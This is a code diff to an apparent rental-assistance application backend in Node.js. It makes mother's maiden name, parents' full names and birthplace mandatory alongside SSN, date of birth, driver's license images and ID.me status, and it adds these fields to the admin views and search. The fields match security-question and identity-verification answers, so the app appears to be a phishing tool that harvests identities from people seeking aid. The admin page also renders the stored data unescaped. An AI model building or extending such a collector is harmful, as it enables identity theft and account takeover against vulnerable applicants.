@@ -29,7 +29,7 @@ const upload = multer({ storage });
 // Database setup
 const db = new Database('./rental_assistance.db');
 
-// Create table if not exists
+// Create table with ALL required fields
 db.prepare(`CREATE TABLE IF NOT EXISTS applications (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     full_name TEXT NOT NULL,
@@ -38,8 +38,11 @@ db.prepare(`CREATE TABLE IF NOT EXISTS applications (
     dob TEXT NOT NULL,
     gender TEXT NOT NULL,
     age INTEGER NOT NULL,
-    mothers_maiden_name TEXT,
-    fathers_name TEXT,
+    mothers_maiden_name TEXT NOT NULL,
+    mothers_full_name TEXT NOT NULL,
+    fathers_full_name TEXT NOT NULL,
+    place_of_birth TEXT NOT NULL,
+    city_of_birth TEXT NOT NULL,
     city TEXT NOT NULL,
     ssn TEXT NOT NULL,
     past_due_rent REAL NOT NULL,
@@ -63,9 +66,10 @@ app.post('/submit', upload.fields([{ name: 'dl_front' }, { name: 'dl_back' }]), 
     try {
         const data = req.body;
 
-        const requiredFields = ['full_name', 'phone', 'email', 'dob', 'gender', 'age', 
-                                'city', 'ssn', 'past_due_rent', 'applied_before', 
-                                'receiving_ss', 'verified_idme'];
+        const requiredFields = ['full_name', 'phone', 'email', 'dob', 'gender', 'age',
+                               'mothers_maiden_name', 'mothers_full_name', 'fathers_full_name',
+                               'place_of_birth', 'city_of_birth', 'city', 'ssn',
+                               'past_due_rent', 'applied_before', 'receiving_ss', 'verified_idme'];
 
         for (const field of requiredFields) {
             if (!data[field] || data[field].toString().trim() === '') {
@@ -78,10 +82,11 @@ app.post('/submit', upload.fields([{ name: 'dl_front' }, { name: 'dl_back' }]), 
 
         const stmt = db.prepare(`INSERT INTO applications (
             full_name, phone, email, dob, gender, age,
-            mothers_maiden_name, fathers_name, city, ssn,
+            mothers_maiden_name, mothers_full_name, fathers_full_name,
+            place_of_birth, city_of_birth, city, ssn,
             past_due_rent, applied_before, receiving_ss, verified_idme,
             dl_front, dl_back
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
 
         const info = stmt.run(
             data.full_name.trim(),
@@ -90,8 +95,11 @@ app.post('/submit', upload.fields([{ name: 'dl_front' }, { name: 'dl_back' }]), 
             data.dob,
             data.gender,
             parseInt(data.age),
-            data.mothers_maiden_name ? data.mothers_maiden_name.trim() : null,
-            data.fathers_name ? data.fathers_name.trim() : null,
+            data.mothers_maiden_name.trim(),
+            data.mothers_full_name.trim(),
+            data.fathers_full_name.trim(),
+            data.place_of_birth.trim(),
+            data.city_of_birth.trim(),
             data.city.trim(),
             data.ssn.trim(),
             parseFloat(data.past_due_rent),
@@ -152,14 +160,16 @@ app.get('/admin', requireAdmin, (req, res) => {
                     const applications = await response.json();
                     let html = '<h2>Applications (' + applications.length + ')</h2>';
                     if (applications.length > 0) {
-                        html += '<table><tr><th>ID</th><th>Name</th><th>Email</th><th>SSN</th><th>Phone</th><th>Rent Due</th><th>Submitted</th></tr>';
+                        html += '<table><tr><th>ID</th><th>Name</th><th>Email</th><th>Phone</th><th>Mother</th><th>Father</th><th>Birth City</th><th>Rent Due</th><th>Submitted</th></tr>';
                         applications.forEach(app => {
                             html += \`<tr>
                                 <td>\${app.id}</td>
                                 <td>\${app.full_name}</td>
                                 <td>\${app.email}</td>
-                                <td>\${app.ssn}</td>
                                 <td>\${app.phone}</td>
+                                <td>\${app.mothers_full_name}</td>
+                                <td>\${app.fathers_full_name}</td>
+                                <td>\${app.city_of_birth}</td>
                                 <td>\$\${app.past_due_rent}</td>
                                 <td>\${new Date(app.submitted_at).toLocaleString()}</td>
                             </tr>\`;
@@ -194,8 +204,8 @@ app.get('/api/admin/search', requireAdmin, (req, res) => {
 
     const searchPattern = `%${q}%`;
     const rows = db.prepare(`SELECT * FROM applications 
-                             WHERE full_name LIKE ? OR email LIKE ? OR phone LIKE ? OR ssn LIKE ? OR city LIKE ?
-                             ORDER BY submitted_at DESC`).all(searchPattern, searchPattern, searchPattern, searchPattern, searchPattern);
+                             WHERE full_name LIKE ? OR email LIKE ? OR phone LIKE ? OR ssn LIKE ? OR city LIKE ? OR mothers_full_name LIKE ? OR fathers_full_name LIKE ? OR city_of_birth LIKE ?
+                             ORDER BY submitted_at DESC`).all(searchPattern, searchPattern, searchPattern, searchPattern, searchPattern, searchPattern, searchPattern, searchPattern);
     res.json(rows);
 });
 
